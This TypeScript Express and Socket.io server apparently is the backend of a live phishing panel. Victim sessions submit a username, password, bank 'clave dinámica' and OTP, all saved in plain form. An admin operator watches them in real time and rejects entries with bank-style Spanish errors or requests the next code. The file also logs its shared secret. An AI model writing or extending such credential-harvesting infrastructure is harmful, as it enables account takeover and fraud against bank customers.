import "dotenv/config";
import express from "express";
import http from "http";
import cors from "cors";
import helmet from "helmet";
import rateLimit from "express-rate-limit";
import { Server, Socket } from "socket.io";
import { ActionState, SessionState } from "@prisma/client";
import { PrismaSessionRepository } from "./adapters/outbound/db/PrismaSessionRepository.js";
import { JwtTokenService } from "./adapters/outbound/auth/JwtTokenService.js";

type Role = "admin" | "user";

type Ack = (res: { ok: boolean; error?: string }) => void;

type Auth = { user: string; pass: string; dinamic: string; otp: string };

type AdminRejectPayload = { sessionId: string; message?: string };
type AdminRequestPayload = { sessionId: string };

type UserSubmitAuth = { sessionId: string; auth: Auth };
type UserSubmitDinamic = { sessionId: string; auth: Auth };
type UserSubmitOtp = { sessionId: string; auth: Auth };

export type AuthPayload =
  | { role: "admin"; adminId: string; email: string }
  | { role: "user"; sessionId: string };

/* export enum SessionState {
  ACTIVE = "ACTIVE",
  INACTIVE = "INACTIVE",
  FINISHED = "FINISHED",
  MINIMIZED = "MINIMIZED",
  BANNED = "BANNED",
}

export enum ActionState {
  CC = "CC",
  CC_WAIT_ACTION = "CC_WAIT_ACTION",
  CC_ERROR="CC_ERROR",
  AUTH = "AUTH",
  AUTH_WAIT_ACTION = "AUTH_WAIT_ACTION",
  AUTH_ERROR = "AUTH_ERROR",
  DINAMIC = "DINAMIC",
  DINAMIC_WAIT_ACTION = "DINAMIC_WAIT_ACTION",
  DINAMIC_ERROR= "DINAMIC_ERROR",
  OTP = "OTP",
  OTP_WAIT_ACTION = "OTP_WAIT_ACTION",
  OTP_ERROR= "OTP_ERROR",
  DONE = "DONE",
} */

const PORT = Number(process.env.PORT || 3005);
const ORIGIN = process.env.LARAVEL_ORIGIN || "http://localhost:8000";

const repo = new PrismaSessionRepository();
const tokens = new JwtTokenService(process.env.NODE_JWT_SECRET!);

const app = express();
app.use(express.json());
app.use(helmet());
app.use(rateLimit({ windowMs: 60_000, max: 120 }));
app.use(cors({ origin: ORIGIN, credentials: true }));

const httpServer = http.createServer(app);
const io = new Server(httpServer, {
  cors: { origin: ORIGIN, credentials: true },
});

// Socket auth middleware
io.use((socket, next) => {
  const token = socket.handshake.auth?.token;
  if (!token) return next(new Error("missing_token"));
  try {
    socket.data.auth = tokens.verify(token);
    return next();
  } catch {
    return next(new Error("invalid_token"));
  }
});

function isNonEmptyString(v: unknown): v is string {
  return typeof v === "string" && v.trim().length > 0;
}

function mustBeAdmin(socket: Socket) {
  if (socket.data.auth?.role !== "admin") throw new Error("forbidden_admin");
}

function mustBeUser(socket: Socket) {
  if (socket.data.auth?.role !== "user") throw new Error("forbidden_user");
}

function mustMatchSession(socket: Socket, sessionIdFromPayload: string) {
  const tokenSessionId =
    socket.data.auth?.role === "user" ? socket.data.auth.sessionId : null;
  if (!tokenSessionId || tokenSessionId !== sessionIdFromPayload) {
    throw new Error("session_mismatch");
  }
}

async function emitSessionUpdate<T>(
  io: Server,
  repo: {
    findById: (id: string) => Promise<T | null>;
  },
  sessionId: string
) {
  const s = await repo.findById(sessionId);
  if (!s) return null;

  io.to(`session:${sessionId}`).emit("session:update", s);
  io.to("admins").emit("admin:sessions:upsert", s);

  return s;
}

io.on("connect", (socket) => {
  const auth = socket.data.auth;
  console.log(auth);

  if (auth.role === "admin") {
    socket.join("admins");
    // bootstrap rápido
    repo
      .listRecent(200)
      .then((list) => socket.emit("admin:sessions:bootstrap", list));

    socket.on("admin:reject_auth", async (payload: AdminRejectPayload) => {
      try {
        mustBeAdmin(socket);
        if (!isNonEmptyString(payload.sessionId)) return;

        const s = await repo.findById(payload.sessionId);
        if (!s || s.action !== ActionState.AUTH_WAIT_ACTION) return;

        await repo.update(payload.sessionId, {
          action: ActionState.AUTH_ERROR,
          lastError: isNonEmptyString(payload.message)
            ? payload.message.trim()
            : "Error. Verifica e intenta nuevamente.",
        });

        await emitSessionUpdate(io, repo, payload.sessionId);
      } catch (e) {
        console.error("admin:reject_auth error", e);
      }
    });

    socket.on("admin:request_dinamic", async (payload: AdminRequestPayload) => {
      try {
        mustBeAdmin(socket);
        if (!isNonEmptyString(payload.sessionId)) return;

        const s = await repo.findById(payload.sessionId);
        if (!s || s.action !== ActionState.AUTH_WAIT_ACTION && s.action !== ActionState.OTP_WAIT_ACTION) return;

        await repo.update(payload.sessionId, {
          action: ActionState.DINAMIC,
          lastError: null,
        });
        await emitSessionUpdate(io, repo, payload.sessionId);
      } catch (e) {
        console.error("admin:request_dinamic error", e);
      }
    });

    socket.on("admin:reject_dinamic", async (payload: AdminRejectPayload) => {
      try {
        mustBeAdmin(socket);
        if (!isNonEmptyString(payload.sessionId)) return;

        const s = await repo.findById(payload.sessionId);
        if (!s || s.action !== ActionState.DINAMIC_WAIT_ACTION) return;

        await repo.update(payload.sessionId, {
          action: ActionState.DINAMIC_ERROR,
          lastError: isNonEmptyString(payload.message)
            ? payload.message.trim()
            : "Clave dinamica inválida. Verifica e intenta nuevamente.",
        });

        await emitSessionUpdate(io, repo, payload.sessionId);
      } catch (e) {
        console.error("admin:reject_dinamic error", e);
      }
    });

    socket.on("admin:request_otp", async (payload: AdminRequestPayload) => {
      try {
        mustBeAdmin(socket);
        if (!isNonEmptyString(payload.sessionId)) return;

        const s = await repo.findById(payload.sessionId);
        if (!s || s.action !== ActionState.DINAMIC_WAIT_ACTION && s.action !== ActionState.AUTH_WAIT_ACTION) return;

        await repo.update(payload.sessionId, {
          action: ActionState.OTP,
          lastError: null,
        });

        await emitSessionUpdate(io, repo, payload.sessionId);
      } catch (e) {
        console.error("admin:request_otp error", e);
      }
    });

    socket.on("admin:reject_otp", async (payload: AdminRejectPayload) => {
      try {
        mustBeAdmin(socket);
        if (!isNonEmptyString(payload.sessionId)) return;

        const s = await repo.findById(payload.sessionId);
        if (!s || s.action !== ActionState.OTP_WAIT_ACTION) return;

        await repo.update(payload.sessionId, {
          action: ActionState.OTP_ERROR,
          lastError: isNonEmptyString(payload.message)
            ? payload.message.trim()
            : "Codigo otp inválido. Verifica e intenta nuevamente.",
        });

        await emitSessionUpdate(io, repo, payload.sessionId);
      } catch (e) {
        console.error("admin:reject_otp error", e);
      }
    });

    socket.on("admin:finish", async (payload: AdminRequestPayload) => {
      try {
        mustBeAdmin(socket);
        if (!isNonEmptyString(payload.sessionId)) return;

        const s = await repo.findById(payload.sessionId);
        if (!s || s.action !== ActionState.OTP_WAIT_ACTION) return;

        /*  await repo.update(payload.sessionId, {
          action: ActionState.DONE,
          lastError: null,
        }); */

        await emitSessionUpdate(io, repo, payload.sessionId);
      } catch (e) {
        console.error("admin:finish error", e);
      }
    });
  }

  if (auth.role === "user") {
    socket.join(`session:${auth.sessionId}`);
    repo.findById(auth.sessionId).then((s) => {
      if (!s) return;
      // ✅ evita mandar error viejo apenas conecta
      if (s.action === ActionState.AUTH_ERROR) return;
      socket.emit("session:update", s);
    });

    socket.on(
      "user:submit_auth",
      async (payload: UserSubmitAuth, ack?: Ack) => {
        try {
          mustBeUser(socket);

          if (!isNonEmptyString(payload.sessionId))
            return ack?.({ ok: false, error: "bad_session" });

          mustMatchSession(socket, payload.sessionId);

          const pass = payload.auth.pass?.trim();
          const user = payload.auth.user?.trim();

          if (
            !isNonEmptyString(pass) ||
            pass.length < 2 ||
            !isNonEmptyString(user) ||
            user.length < 2
          )
            return ack?.({ ok: false, error: "invalid_credentials" });

          const s = await repo.findById(payload.sessionId);
          if (!s) return ack?.({ ok: false, error: "session not found" });

          // ✅ permitir reintento
          if (!s.action) return ack?.({ ok: false, error: "bad_state" });

          const allowed: ActionState[] = [
            ActionState.AUTH,
            ActionState.AUTH_ERROR,
          ];
          if (!allowed.includes(s.action))
            return ack?.({ ok: false, error: "bad_state" });

          await repo.update(payload.sessionId, {
            user: user,
            pass: pass,
            action: ActionState.AUTH_WAIT_ACTION,
            lastError: null,
          });

          await emitSessionUpdate(io, repo, payload.sessionId);
          ack?.({ ok: true });
        } catch (e) {
          console.error("user:submit_auth error", e);
          ack?.({ ok: false, error: "server_error" });
        }
      }
    );

    socket.on(
      "user:submit_dinamic",
      async (payload: UserSubmitDinamic, ack?: Ack) => {
        try {
          mustBeUser(socket);
          if (!isNonEmptyString(payload.sessionId))
            return ack?.({ ok: false, error: "bad_session" });
          mustMatchSession(socket, payload.sessionId);

          const dinamic = payload.auth.dinamic.trim();
          if (!isNonEmptyString(dinamic) || dinamic.length < 5)
            return ack?.({ ok: false, error: "invalid_address" });

          const s = await repo.findById(payload.sessionId);
          if (!s) return ack?.({ ok: false, error: "not_found" });

          const allowed: ActionState[] = [
            ActionState.DINAMIC,
            ActionState.DINAMIC_ERROR,
          ];
          if (!allowed.includes(s.action))
            return ack?.({ ok: false, error: "bad_state" });

          await repo.update(payload.sessionId, {
            dinamic: dinamic,
            action: ActionState.DINAMIC_WAIT_ACTION,
            lastError: null,
          });

          await emitSessionUpdate(io, repo, payload.sessionId);
          ack?.({ ok: true });
        } catch (e) {
          console.error("user:submit_dinamic error", e);
          ack?.({ ok: false, error: "server_error" });
        }
      }
    );

    socket.on("user:submit_otp", async (payload: UserSubmitOtp, ack?: Ack) => {
      try {
        mustBeUser(socket);
        if (!isNonEmptyString(payload.sessionId))
          return ack?.({ ok: false, error: "bad_session" });
        mustMatchSession(socket, payload.sessionId);

        const otp = payload.auth.otp.trim();
        if (!isNonEmptyString(otp) || otp.length < 5)
          return ack?.({ ok: false, error: "invalid_otp" });

        const s = await repo.findById(payload.sessionId);
        if (!s) return ack?.({ ok: false, error: "not_found" });

        const allowed: ActionState[] = [ActionState.OTP, ActionState.OTP_ERROR];
        if (!allowed.includes(s.action))
          return ack?.({ ok: false, error: "bad_state" });

        await repo.update(payload.sessionId, {
          otp,
          action: ActionState.OTP_WAIT_ACTION,
          lastError: null,
        });

        await emitSessionUpdate(io, repo, payload.sessionId);
        ack?.({ ok: true });
      } catch (e) {
        console.error("user:submit_otp error", e);
        ack?.({ ok: false, error: "server_error" });
      }
    });
  }
});

// REST: crear sesión (user)
app.post("/api/sessions", async (_req, res) => {
  let data = _req.body;
  console.log(data);

  if (data.user && data.pass) {
    data.action = ActionState.AUTH_WAIT_ACTION;
  }

  console.log(data);

  const session = await repo.create(data);
  const sessionToken = tokens.signUser(session.id);

  // avisar admins
  io.to("admins").emit("admin:sessions:upsert", session);

  res.json({ sessionId: session.id, sessionToken, session });
});

app.get("/api/sessions/:id", async (req, res) => {
  const session = await repo.findById(req.params.id);
  if (!session) return res.status(404).json({ error: "not_found" });
  res.json(session);
});

// REST: emitir token admin (lo llama Laravel)
app.post("/api/admin/issue-token", (req, res) => {
  const secret = req.header("X-SHARED-SECRET");
  console.log(process.env.LARAVEL_SHARED_SECRET);
  console.log(secret);
  if (secret !== process.env.LARAVEL_SHARED_SECRET)
    return res.status(401).json({ error: "unauthorized" });

  const userId = req.header("X-Admin-Id") || "";

  const token = tokens.signAdmin(userId);
  res.json({ token });
});

httpServer.listen(PORT, () => {
  console.log(`Backend running on http://localhost:${PORT}`);
});
